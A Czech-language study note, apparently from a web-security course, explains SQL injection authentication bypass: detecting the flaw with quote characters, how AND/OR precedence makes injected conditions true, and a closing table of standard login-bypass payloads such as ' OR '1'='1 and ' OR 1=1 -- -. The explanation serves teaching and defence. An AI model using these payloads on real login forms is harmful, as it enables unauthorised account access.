## 🔑 Authentication Bypass

Princip vynechání nebo obcházení přihlašovacích údajů spočívá v úpravě logiky klauzule `WHERE` tak, aby celkový SQL dotaz vyhodnotil vstup jako **Pravdu (`TRUE`)**, i když uživatel nezadá platné heslo.

### 🔍 Detekce zranitelnosti (SQLi Discovery)

Prvním krokem k odhalení zranitelnosti je vložení nebezpečných řídicích znaků do vstupu (např. v přihlašovacím formuláři):

Plaintext

```
'  "  #  ;  )
```

Zadání samotné jednoduché uvozovky (`'`) způsobí nekonzistentní počet uvozovek v původním SQL dotazu, což vede k **syntaktické chybě**:

SQL

```
SELECT * FROM logins WHERE username=''' AND password = 'something';
-- Syntaktická chyba: Liché množství uvozovek
```

## 🧪 Princip injekce operátoru `OR`

Při vyhodnocování SQL dotazu má operátor `AND` vyšší prioritu než operátor `OR`. Útočník tuto vlastnost zneužije vložením podmínky, která je **vždy pravdivá** (např. `'1'='1'`).

### 1. Útok se známým uživatelským jménem (`admin`)

Do pole **Username** vložíme: `admin' or '1'='1` (v poli Password zadáme libovolný text).

SQL

```
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

#### Průběh vyhodnocení databází:

1. **Vyhodnocení `AND` (vyšší priorita):** `'1'='1'` _(True)_ `AND` `password='something'` _(False)_ $\rightarrow$ **`FALSE`**.
    
2. **Vyhodnocení `OR`:** `username='admin'` _(True)_ `OR` **`FALSE`** $\rightarrow$ **`TRUE`**.
    
3. Jelikož účet `admin` v databázi existuje, dotaz vrátí jeho záznam a uživatel je přihlášen.
    

### 2. Útok bez znalosti uživatelského jména

Pokud neznáme platné uživatelské jméno, můžeme injektovat pole **Password** řetězcem: `something' or '1'='1` (nebo do obou polí přímo `' or '1'='1`).

SQL

```
SELECT * FROM logins WHERE username='cokoliv' AND password='something' or '1'='1';
```

#### Průběh vyhodnocení:

1. **Původní podmínka s `AND`:** neexistující uživatel/heslo vrátí **`FALSE`**.
    
2. **Pravdivá podmínka za `OR`:** `'1'='1'` vrátí **`TRUE`**.
    
3. **Výsledek (`FALSE` OR `TRUE`):** Celkový dotaz se vyhodnotí jako **`TRUE`** a databáze vrátí všechny záznamy. Aplikace typicky přihlásí uživatele z prvního řádku (nejčastěji administrátora).
    

## 🛠️ Přehled univerzálních Payloadů pro Auth Bypass

| **Payload**            | **Popis fungování**                                     |
| ---------------------- | ------------------------------------------------------- |
| **`admin' OR '1'='1`** | Přihlášení k účtu `admin` bez znalosti hesla.           |
| **`' OR '1'='1`**      | Univerzální bypass bez nutnosti znát uživatelské jméno. |
| **`' OR 1=1 -- -`**    | Bypass s odříznutím kontroly hesla pomocí komentáře.    |
| **`" OR "1"="1`**      | Alternativa pro dotazy využívající dvojité uvozovky.    |
